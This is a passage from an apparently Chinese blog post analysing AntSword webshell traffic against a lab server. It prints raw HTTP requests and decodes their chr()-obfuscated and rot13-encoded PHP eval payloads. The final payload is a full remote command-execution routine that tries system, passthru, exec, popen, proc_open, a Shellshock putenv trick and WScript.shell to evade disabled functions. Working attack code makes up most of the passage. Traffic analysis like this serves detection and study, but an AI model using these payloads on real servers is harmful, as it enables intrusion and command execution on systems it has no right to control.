class="line">cmd&#x3D;%40eVAl(cHr(0x40).ChR(0x69).ChR(0x6e).ChR(0x69).ChR(0x5f).ChR(0x73).ChR(0x65).ChR(0x74).ChR(0x28).ChR(0x22).ChR(0x64).ChR(0x69).ChR(0x73).ChR(0x70).ChR(0x6c).ChR(0x61).ChR(0x79).ChR(0x5f).ChR(0x65).ChR(0x72).ChR(0x72).ChR(0x6f).ChR(0x72).ChR(0x73).ChR(0x22).ChR(0x2c).ChR(0x20).ChR(0x22).ChR(0x30).ChR(0x22).ChR(0x29).ChR(0x3b).ChR(0x40).ChR(0x73).ChR(0x65).ChR(0x74).ChR(0x5f).ChR(0x74).ChR(0x69).ChR(0x6d).ChR(0x65).ChR(0x5f).ChR(0x6c).ChR(0x69).ChR(0x6d).ChR(0x69).ChR(0x74).ChR(0x28).ChR(0x30).ChR(0x29).ChR(0x3b).ChR(0x66).ChR(0x75).ChR(0x6e).ChR(0x63).ChR(0x74).ChR(0x69).ChR(0x6f).ChR(0x6e).ChR(0x20).ChR(0x61).ChR(0x73).ChR(0x65).ChR(0x6e).ChR(0x63).ChR(0x28).ChR(0x24).ChR(0x6f).ChR(0x75).ChR(0x74).ChR(0x29).ChR(0x7b).ChR(0x72).ChR(0x65).ChR(0x74).ChR(0x75).ChR(0x72).ChR(0x6e).ChR(0x20).ChR(0x24).ChR(0x6f).ChR(0x75).ChR(0x74).ChR(0x3b).ChR(0x7d).ChR(0x3b).ChR(0x66).ChR(0x75).ChR(0x6e).ChR(0x63).ChR(0x74).ChR(0x69).ChR(0x6f).ChR(0x6e).ChR(0x20).ChR(0x61).ChR(0x73).ChR(0x6f).ChR(0x75).ChR(0x74).ChR(0x70).ChR(0x75).ChR(0x74).ChR(0x28).ChR(0x29).ChR(0x7b).ChR(0x24).ChR(0x6f).ChR(0x75).ChR(0x74).ChR(0x70).ChR(0x75).ChR(0x74).ChR(0x3d).ChR(0x6f).ChR(0x62).ChR(0x5f).ChR(0x67).ChR(0x65).ChR(0x74).ChR(0x5f).ChR(0x63).ChR(0x6f).ChR(0x6e).ChR(0x74).ChR(0x65).ChR(0x6e).ChR(0x74).ChR(0x73).ChR(0x28).ChR(0x29).ChR(0x3b).ChR(0x6f).ChR(0x62).ChR(0x5f).ChR(0x65).ChR(0x6e).ChR(0x64).ChR(0x5f).ChR(0x63).ChR(0x6c).ChR(0x65).ChR(0x61).ChR(0x6e).ChR(0x28).ChR(0x29).ChR(0x3b).ChR(0x65).ChR(0x63).ChR(0x68).ChR(0x6f).ChR(0x20).ChR(0x22).ChR(0x33).ChR(0x65).ChR(0x32).ChR(0x35).ChR(0x62).ChR(0x36).ChR(0x63).ChR(0x22).ChR(0x3b).ChR(0x65).ChR(0x63).ChR(0x68).ChR(0x6f).ChR(0x20).ChR(0x40).ChR(0x61).ChR(0x73).ChR(0x65).ChR(0x6e).ChR(0x63).ChR(0x28).ChR(0x24).ChR(0x6f).ChR(0x75).ChR(0x74).ChR(0x70).ChR(0x75).ChR(0x74).ChR(0x29).ChR(0x3b).ChR(0x65).ChR(0x63).ChR(0x68).ChR(0x6f).ChR(0x20).ChR(0x22).ChR(0x61).ChR(0x37).ChR(0x35).ChR(0x61).ChR(0x38).ChR(0x38).ChR(0x61).ChR(0x22).ChR(0x3b).ChR(0x7d).ChR(0x6f).ChR(0x62).ChR(0x5f).ChR(0x73).ChR(0x74).ChR(0x61).ChR(0x72).ChR(0x74).ChR(0x28).ChR(0x29).ChR(0x3b).ChR(0x74).ChR(0x72).ChR(0x79).ChR(0x7b).ChR(0x24).ChR(0x44).ChR(0x3d).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x6e).ChR(0x61).ChR(0x6d).ChR(0x65).ChR(0x28).ChR(0x24).ChR(0x5f).ChR(0x53).ChR(0x45).ChR(0x52).ChR(0x56).ChR(0x45).ChR(0x52).ChR(0x5b).ChR(0x22).ChR(0x53).ChR(0x43).ChR(0x52).ChR(0x49).ChR(0x50).ChR(0x54).ChR(0x5f).ChR(0x46).ChR(0x49).ChR(0x4c).ChR(0x45).ChR(0x4e).ChR(0x41).ChR(0x4d).ChR(0x45).ChR(0x22).ChR(0x5d).ChR(0x29).ChR(0x3b).ChR(0x69).ChR(0x66).ChR(0x28).ChR(0x24).ChR(0x44).ChR(0x3d).ChR(0x3d).ChR(0x22).ChR(0x22).ChR(0x29).ChR(0x24).ChR(0x44).ChR(0x3d).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x6e).ChR(0x61).ChR(0x6d).ChR(0x65).ChR(0x28).ChR(0x24).ChR(0x5f).ChR(0x53).ChR(0x45).ChR(0x52).ChR(0x56).ChR(0x45).ChR(0x52).ChR(0x5b).ChR(0x22).ChR(0x50).ChR(0x41).ChR(0x54).ChR(0x48).ChR(0x5f).ChR(0x54).ChR(0x52).ChR(0x41).ChR(0x4e).ChR(0x53).ChR(0x4c).ChR(0x41).ChR(0x54).ChR(0x45).ChR(0x44).ChR(0x22).ChR(0x5d).ChR(0x29).ChR(0x3b).ChR(0x24).ChR(0x52).ChR(0x3d).ChR(0x22).ChR(0x7b).ChR(0x24).ChR(0x44).ChR(0x7d).ChR(0x9).ChR(0x22).ChR(0x3b).ChR(0x69).ChR(0x66).ChR(0x28).ChR(0x73).ChR(0x75).ChR(0x62).ChR(0x73).ChR(0x74).ChR(0x72).ChR(0x28).ChR(0x24).ChR(0x44).ChR(0x2c).ChR(0x30).ChR(0x2c).ChR(0x31).ChR(0x29).ChR(0x21).ChR(0x3d).ChR(0x22).ChR(0x2f).ChR(0x22).ChR(0x29).ChR(0x7b).ChR(0x66).ChR(0x6f).ChR(0x72).ChR(0x65).ChR(0x61).ChR(0x63).ChR(0x68).ChR(0x28).ChR(0x72).ChR(0x61).ChR(0x6e).ChR(0x67).ChR(0x65).ChR(0x28).ChR(0x22).ChR(0x43).ChR(0x22).ChR(0x2c).ChR(0x22).ChR(0x5a).ChR(0x22).ChR(0x29).ChR(0x61).ChR(0x73).ChR(0x20).ChR(0x24).ChR(0x4c).ChR(0x29).ChR(0x69).ChR(0x66).ChR(0x28).ChR(0x69).ChR(0x73).ChR(0x5f).ChR(0x64).ChR(0x69).ChR(0x72).ChR(0x28).ChR(0x22).ChR(0x7b).ChR(0x24).ChR(0x4c).ChR(0x7d).ChR(0x3a).ChR(0x22).ChR(0x29).ChR(0x29).ChR(0x24).ChR(0x52).ChR(0x2e).ChR(0x3d).ChR(0x22).ChR(0x7b).ChR(0x24).ChR(0x4c).ChR(0x7d).ChR(0x3a).ChR(0x22).ChR(0x3b).ChR(0x7d).ChR(0x65).ChR(0x6c).ChR(0x73).ChR(0x65).ChR(0x7b).ChR(0x24).ChR(0x52).ChR(0x2e).ChR(0x3d).ChR(0x22).ChR(0x2f).ChR(0x22).ChR(0x3b).ChR(0x7d).ChR(0x24).ChR(0x52).ChR(0x2e).ChR(0x3d).ChR(0x22).ChR(0x9).ChR(0x22).ChR(0x3b).ChR(0x24).ChR(0x75).ChR(0x3d).ChR(0x28).ChR(0x66).ChR(0x75).ChR(0x6e).ChR(0x63).ChR(0x74).ChR(0x69).ChR(0x6f).ChR(0x6e).ChR(0x5f).ChR(0x65).ChR(0x78).ChR(0x69).ChR(0x73).ChR(0x74).ChR(0x73).ChR(0x28).ChR(0x22).ChR(0x70).ChR(0x6f).ChR(0x73).ChR(0x69).ChR(0x78).ChR(0x5f).ChR(0x67).ChR(0x65).ChR(0x74).ChR(0x65).ChR(0x67).ChR(0x69).ChR(0x64).ChR(0x22).ChR(0x29).ChR(0x29).ChR(0x3f).ChR(0x40).ChR(0x70).ChR(0x6f).ChR(0x73).ChR(0x69).ChR(0x78).ChR(0x5f).ChR(0x67).ChR(0x65).ChR(0x74).ChR(0x70).ChR(0x77).ChR(0x75).ChR(0x69).ChR(0x64).ChR(0x28).ChR(0x40).ChR(0x70).ChR(0x6f).ChR(0x73).ChR(0x69).ChR(0x78).ChR(0x5f).ChR(0x67).ChR(0x65).ChR(0x74).ChR(0x65).ChR(0x75).ChR(0x69).ChR(0x64).ChR(0x28).ChR(0x29).ChR(0x29).ChR(0x3a).ChR(0x22).ChR(0x22).ChR(0x3b).ChR(0x24).ChR(0x73).ChR(0x3d).ChR(0x28).ChR(0x24).ChR(0x75).ChR(0x29).ChR(0x3f).ChR(0x24).ChR(0x75).ChR(0x5b).ChR(0x22).ChR(0x6e).ChR(0x61).ChR(0x6d).ChR(0x65).ChR(0x22).ChR(0x5d).ChR(0x3a).ChR(0x40).ChR(0x67).ChR(0x65).ChR(0x74).ChR(0x5f).ChR(0x63).ChR(0x75).ChR(0x72).ChR(0x72).ChR(0x65).ChR(0x6e).ChR(0x74).ChR(0x5f).ChR(0x75).ChR(0x73).ChR(0x65).ChR(0x72).ChR(0x28).ChR(0x29).ChR(0x3b).ChR(0x24).ChR(0x52).ChR(0x2e).ChR(0x3d).ChR(0x70).ChR(0x68).ChR(0x70).ChR(0x5f).ChR(0x75).ChR(0x6e).ChR(0x61).ChR(0x6d).ChR(0x65).ChR(0x28).ChR(0x29).ChR(0x3b).ChR(0x24).ChR(0x52).ChR(0x2e).ChR(0x3d).ChR(0x22).ChR(0x9).ChR(0x7b).ChR(0x24).ChR(0x73).ChR(0x7d).ChR(0x22).ChR(0x3b).ChR(0x65).ChR(0x63).ChR(0x68).ChR(0x6f).ChR(0x20).ChR(0x24).ChR(0x52).ChR(0x3b).ChR(0x3b).ChR(0x7d).ChR(0x63).ChR(0x61).ChR(0x74).ChR(0x63).ChR(0x68).ChR(0x28).ChR(0x45).ChR(0x78).ChR(0x63).ChR(0x65).ChR(0x70).ChR(0x74).ChR(0x69).ChR(0x6f).ChR(0x6e).ChR(0x20).ChR(0x24).ChR(0x65).ChR(0x29).ChR(0x7b).ChR(0x65).ChR(0x63).ChR(0x68).ChR(0x6f).ChR(0x20).ChR(0x22).ChR(0x45).ChR(0x52).ChR(0x52).ChR(0x4f).ChR(0x52).ChR(0x3a).ChR(0x2f).ChR(0x2f).ChR(0x22).ChR(0x2e).ChR(0x24).ChR(0x65).ChR(0x2d).ChR(0x3e).ChR(0x67).ChR(0x65).ChR(0x74).ChR(0x4d).ChR(0x65).ChR(0x73).ChR(0x73).ChR(0x61).ChR(0x67).ChR(0x65).ChR(0x28).ChR(0x29).ChR(0x3b).ChR(0x7d).ChR(0x3b).ChR(0x61).ChR(0x73).ChR(0x6f).ChR(0x75).ChR(0x74).ChR(0x70).ChR(0x75).ChR(0x74).ChR(0x28).ChR(0x29).ChR(0x3b).ChR(0x64).ChR(0x69).ChR(0x65).ChR(0x28).ChR(0x29).ChR(0x3b))%3B</span><br></pre></td></tr></table></figure><p>æµ‹è¯•rot13</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;shell0.php HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.217.128:100</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: antSword&#x2F;v2.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 1064</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">cmd&#x3D;%40eval(%40str_rot13(%24_POST%5Bm3fad46e15e6b5%5D))%3B&amp;m3fad46e15e6b5&#x3D;%40vav_frg(%22qvfcynl_reebef%22%2C%20%220%22)%3B%40frg_gvzr_yvzvg(0)%3Bshapgvba%20nfrap(%24bhg)%7Berghea%20%24bhg%3B%7D%3Bshapgvba%20nfbhgchg()%7B%24bhgchg%3Dbo_trg_pbagragf()%3Bbo_raq_pyrna()%3Brpub%20%223on4r1q%22%3Brpub%20%40nfrap(%24bhgchg)%3Brpub%20%22sps90147n686%22%3B%7Dbo_fgneg()%3Bgel%7B%24Q%3Dqveanzr(%24_FREIRE%5B%22FPEVCG_SVYRANZR%22%5D)%3Bvs(%24Q%3D%3D%22%22)%24Q%3Dqveanzr(%24_FREIRE%5B%22CNGU_GENAFYNGRQ%22%5D)%3B%24E%3D%22%7B%24Q%7D%09%22%3Bvs(fhofge(%24Q%2C0%2C1)!%3D%22%2F%22)%7Bsbernpu(enatr(%22P%22%2C%22M%22)nf%20%24Y)vs(vf_qve(%22%7B%24Y%7D%3A%22))%24E.%3D%22%7B%24Y%7D%3A%22%3B%7Dryfr%7B%24E.%3D%22%2F%22%3B%7D%24E.%3D%22%09%22%3B%24h%3D(shapgvba_rkvfgf(%22cbfvk_trgrtvq%22))%3F%40cbfvk_trgcjhvq(%40cbfvk_trgrhvq())%3A%22%22%3B%24f%3D(%24h)%3F%24h%5B%22anzr%22%5D%3A%40trg_pheerag_hfre()%3B%24E.%3Dcuc_hanzr()%3B%24E.%3D%22%09%7B%24f%7D%22%3Brpub%20%24E%3B%3B%7Dpngpu(Rkprcgvba%20%24r)%7Brpub%20%22REEBE%3A%2F%2F%22.%24r-%3EtrgZrffntr()%3B%7D%3Bnfbhgchg()%3Bqvr()%3B</span><br></pre></td></tr></table></figure><p>urlè§£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd&#x3D;@eval(@str_rot13($_POST[m3fad46e15e6b5]));</span><br><span class="line">m3fad46e15e6b5&#x3D;@vav_frg(&quot;qvfcynl_reebef&quot;, &quot;0&quot;);@frg_gvzr_yvzvg(0);shapgvba nfrap($bhg)&#123;erghea $bhg;&#125;;shapgvba nfbhgchg()&#123;$bhgchg&#x3D;bo_trg_pbagragf();bo_raq_pyrna();rpub &quot;3on4r1q&quot;;rpub @nfrap($bhgchg);rpub &quot;sps90147n686&quot;;&#125;bo_fgneg();gel&#123;$Q&#x3D;qveanzr($_FREIRE[&quot;FPEVCG_SVYRANZR&quot;]);vs($Q&#x3D;&#x3D;&quot;&quot;)$Q&#x3D;qveanzr($_FREIRE[&quot;CNGU_GENAFYNGRQ&quot;]);$E&#x3D;&quot;&#123;$Q&#125;&quot;;vs(fhofge($Q,0,1)!&#x3D;&quot;&#x2F;&quot;)&#123;sbernpu(enatr(&quot;P&quot;,&quot;M&quot;)nf $Y)vs(vf_qve(&quot;&#123;$Y&#125;:&quot;))$E.&#x3D;&quot;&#123;$Y&#125;:&quot;;&#125;ryfr&#123;$E.&#x3D;&quot;&#x2F;&quot;;&#125;$E.&#x3D;&quot;&quot;;$h&#x3D;(shapgvba_rkvfgf(&quot;cbfvk_trgrtvq&quot;))?@cbfvk_trgcjhvq(@cbfvk_trgrhvq()):&quot;&quot;;$f&#x3D;($h)?$h[&quot;anzr&quot;]:@trg_pheerag_hfre();$E.&#x3D;cuc_hanzr();$E.&#x3D;&quot;&#123;$f&#125;&quot;;rpub $E;;&#125;pngpu(Rkprcgvba $r)&#123;rpub &quot;REEBE:&#x2F;&#x2F;&quot;.$r-&gt;trgZrffntr();&#125;;nfbhgchg();qvr();</span><br></pre></td></tr></table></figure><p>rot13è§£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);function asenc($out)&#123;return $out;&#125;;function asoutput()&#123;$output&#x3D;ob_get_contents();ob_end_clean();echo &quot;3ba4e1d&quot;;echo @asenc($output);echo &quot;fcf90147a686&quot;;&#125;ob_start();try&#123;$d&#x3D;dirname($_server[&quot;script_filename&quot;]);if($d&#x3D;&#x3D;&quot;&quot;)$d&#x3D;dirname($_server[&quot;path_translated&quot;]);$r&#x3D;&quot;&#123;$d&#125;&quot;;if(substr($d,0,1)!&#x3D;&quot;&#x2F;&quot;)&#123;foreach(range(&quot;c&quot;,&quot;z&quot;)as $l)if(is_dir(&quot;&#123;$l&#125;:&quot;))$r.&#x3D;&quot;&#123;$l&#125;:&quot;;&#125;else&#123;$r.&#x3D;&quot;&#x2F;&quot;;&#125;$r.&#x3D;&quot;&quot;;$u&#x3D;(function_exists(&quot;posix_getegid&quot;))?@posix_getpwuid(@posix_geteuid()):&quot;&quot;;$s&#x3D;($u)?$u[&quot;name&quot;]:@get_current_user();$r.&#x3D;php_uname();$r.&#x3D;&quot;&#123;$s&#125;&quot;;echo $r;;&#125;catch(exception $e)&#123;echo &quot;error:&#x2F;&#x2F;&quot;.$e-&gt;getmessage();&#125;;asoutput();die();</span><br></pre></td></tr></table></figure><p>ä»£ç è·Ÿä¹‹å‰çš„ä¸€æ¨¡ä¸€æ ·</p><h3 id="è™šæ‹Ÿç»ˆç«¯"><a href="#è™šæ‹Ÿç»ˆç«¯" class="headerlink" title="è™šæ‹Ÿç»ˆç«¯"></a>è™šæ‹Ÿç»ˆç«¯</h3><p>æµ‹è¯•ä¸€ä¸ªæœ€ç®€å•çš„lså‘½ä»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;shell0.php HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.217.128:100</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: antSword&#x2F;v2.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 4019</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">c5980976ee6af&#x3D;&amp;cmd&#x3D;%40ini_set(%22display_errors%22%2C%20%220%22)%3B%40set_time_limit(0)%3Bfunction%20asenc(%24out)%7Breturn%20%24out%3B%7D%3Bfunction%20asoutput()%7B%24output%3Dob_get_contents()%3Bob_end_clean()%3Becho%20%2201fba%22%3Becho%20%40asenc(%24output)%3Becho%20%2278e6dcac%22%3B%7Dob_start()%3Btry%7B%24p%3Dbase64_decode(%24_POST%5B%22mbd5f87b32df2b%22%5D)%3B%24s%3Dbase64_decode(%24_POST%5B%22dd32c0973cea1a%22%5D)%3B%24envstr%3D%40base64_decode(%24_POST%5B%22c5980976ee6af%22%5D)%3B%24d%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3B%24c%3Dsubstr(%24d%2C0%2C1)%3D%3D%22%2F%22%3F%22-c%20%5C%22%7B%24s%7D%5C%22%22%3A%22%2Fc%20%5C%22%7B%24s%7D%5C%22%22%3Bif(substr(%24d%2C0%2C1)%3D%3D%22%2F%22)%7B%40putenv(%22PATH%3D%22.getenv(%22PATH%22).%22%3A%2Fusr%2Flocal%2Fsbin%3A%2Fusr%2Flocal%2Fbin%3A%2Fusr%2Fsbin%3A%2Fusr%2Fbin%3A%2Fsbin%3A%2Fbin%22)%3B%7Delse%7B%40putenv(%22PATH%3D%22.getenv(%22PATH%22).%22%3BC%3A%2FWindows%2Fsystem32%3BC%3A%2FWindows%2FSysWOW64%3BC%3A%2FWindows%3BC%3A%2FWindows%2FSystem32%2FWindowsPowerShell%2Fv1.0%2F%3B%22)%3B%7Dif(!empty(%24envstr))%7B%24envarr%3Dexplode(%22%7C%7C%7Casline%7C%7C%7C%22%2C%20%24envstr)%3Bforeach(%24envarr%20as%20%24v)%20%7Bif%20(!empty(%24v))%20%7B%40putenv(str_replace(%22%7C%7C%7Caskey%7C%7C%7C%22%2C%20%22%3D%22%2C%20%24v))%3B%7D%7D%7D%24r%3D%22%7B%24p%7D%20%7B%24c%7D%22%3Bfunction%20fe(%24f)%7B%24d%3Dexplode(%22%2C%22%2C%40ini_get(%22disable_functions%22))%3Bif(empty(%24d))%7B%24d%3Darray()%3B%7Delse%7B%24d%3Darray_map(&#39;trim&#39;%2Carray_map(&#39;strtolower&#39;%2C%24d))%3B%7Dreturn(function_exists(%24f)%26%26is_callable(%24f)%26%26!in_array(%24f%2C%24d))%3B%7D%3Bfunction%20runshellshock(%24d%2C%20%24c)%20%7Bif%20(substr(%24d%2C%200%2C%201)%20%3D%3D%20%22%2F%22%20%26%26%20fe(&#39;putenv&#39;)%20%26%26%20(fe(&#39;error_log&#39;)%20%7C%7C%20fe(&#39;mail&#39;)))%20%7Bif%20(strstr(readlink(%22%2Fbin%2Fsh%22)%2C%20%22bash%22)%20!%3D%20FALSE)%20%7B%24tmp%20%3D%20tempnam(sys_get_temp_dir()%2C%20&#39;as&#39;)%3Bputenv(%22PHP_LOL%3D()%20%7B%20x%3B%20%7D%3B%20%24c%20%3E%24tmp%202%3E%261%22)%3Bif%20(fe(&#39;error_log&#39;))%20%7Berror_log(%22a%22%2C%201)%3B%7D%20else%20%7Bmail(%22a%40127.0.0.1%22%2C%20%22%22%2C%20%22%22%2C%20%22-bv%22)%3B%7D%7D%20else%20%7Breturn%20False%3B%7D%24output%20%3D%20%40file_get_contents(%24tmp)%3B%40unlink(%24tmp)%3Bif%20(%24output%20!%3D%20%22%22)%20%7Bprint(%24output)%3Breturn%20True%3B%7D%7Dreturn%20False%3B%7D%3Bfunction%20runcmd(%24c)%7B%24ret%3D0%3B%24d%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3Bif(fe(&#39;system&#39;))%7B%40system(%24c%2C%24ret)%3B%7Delseif(fe(&#39;passthru&#39;))%7B%40passthru(%24c%2C%24ret)%3B%7Delseif(fe(&#39;shell_exec&#39;))%7Bprint(%40shell_exec(%24c))%3B%7Delseif(fe(&#39;exec&#39;))%7B%40exec(%24c%2C%24o%2C%24ret)%3Bprint(join(%22%0A%22%2C%24o))%3B%7Delseif(fe(&#39;popen&#39;))%7B%24fp%3D%40popen(%24c%2C&#39;r&#39;)%3Bwhile(!%40feof(%24fp))%7Bprint(%40fgets(%24fp%2C2048))%3B%7D%40pclose(%24fp)%3B%7Delseif(fe(&#39;proc_open&#39;))%7B%24p%20%3D%20%40proc_open(%24c%2C%20array(1%20%3D%3E%20array(&#39;pipe&#39;%2C%20&#39;w&#39;)%2C%202%20%3D%3E%20array(&#39;pipe&#39;%2C%20&#39;w&#39;))%2C%20%24io)%3Bwhile(!%40feof(%24io%5B1%5D))%7Bprint(%40fgets(%24io%5B1%5D%2C2048))%3B%7Dwhile(!%40feof(%24io%5B2%5D))%7Bprint(%40fgets(%24io%5B2%5D%2C2048))%3B%7D%40fclose(%24io%5B1%5D)%3B%40fclose(%24io%5B2%5D)%3B%40proc_close(%24p)%3B%7Delseif(fe(&#39;antsystem&#39;))%7B%40antsystem(%24c)%3B%7Delseif(runshellshock(%24d%2C%20%24c))%20%7Breturn%20%24ret%3B%7Delseif(substr(%24d%2C0%2C1)!%3D%22%2F%22%20%26%26%20%40class_exists(%22COM%22))%7B%24w%3Dnew%20COM(&#39;WScript.shell&#39;)%3B%24e%3D%24w-%3Eexec(%24c)%3B%24so%3D%24e-%3EStdOut()%3B%24ret.%3D%24so-%3EReadAll()%3B%24se%3D%24e-%3EStdErr()%3B%24ret.%3D%24se-%3EReadAll()%3Bprint(%24ret)%3B%7Delse%7B%24ret%20%3D%20127%3B%7Dreturn%20%24ret%3B%7D%3B%24ret%3D%40runcmd(%24r.%22%202%3E%261%22)%3Bprint%20(%24ret!%3D0)%3F%22ret%3D%7B%24ret%7D%22%3A%22%22%3B%3B%7Dcatch(Exception%20%24e)%7Becho%20%22ERROR%3A%2F%2F%22.%24e-%3EgetMessage()%3B%7D%3Basoutput()%3Bdie()%3B&amp;dd32c0973cea1a&#x3D;Y2QgIi92YXIvd3d3L2h0bWwiO2xzO2VjaG8gW1NdO3B3ZDtlY2hvIFtFXQ%3D%3D&amp;mbd5f87b32df2b&#x3D;L2Jpbi9zaA%3D%3D</span><br></pre></td></tr></table></figure><p>urlè§£ç ï¼Œæ ¼å¼åŒ–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line">c5980976ee6af=</span><br><span class="line">cmd=</span><br><span class="line">@ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$output</span>=ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;01fba&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> @asenc(<span class="variable">$output</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;78e6dcac&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable">$p</span>=base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;mbd5f87b32df2b&quot;</span>]);</span><br><span class="line">    <span class="variable">$s</span>=base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;dd32c0973cea1a&quot;</span>]);</span><br><span class="line">    <span class="variable">$envstr</span>=@base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;c5980976ee6af&quot;</span>]);</span><br><span class="line">    <span class="variable">$d</span>=dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">    <span class="variable">$c</span>=substr(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&quot;/&quot;</span>?<span class="string">&quot;-c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>:<span class="string">&quot;/c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(substr(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&quot;/&quot;</span>)&#123;</span><br><span class="line">        @putenv(<span class="string">&quot;PATH=&quot;</span>.getenv(<span class="string">&quot;PATH&quot;</span>).<span class="string">&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        @putenv(<span class="string">&quot;PATH=&quot;</span>.getenv(<span class="string">&quot;PATH&quot;</span>).<span class="string">&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$envstr</span>))&#123;</span><br><span class="line">        <span class="variable">$envarr</span>=explode(<span class="string">&quot;|||asline|||&quot;</span>, 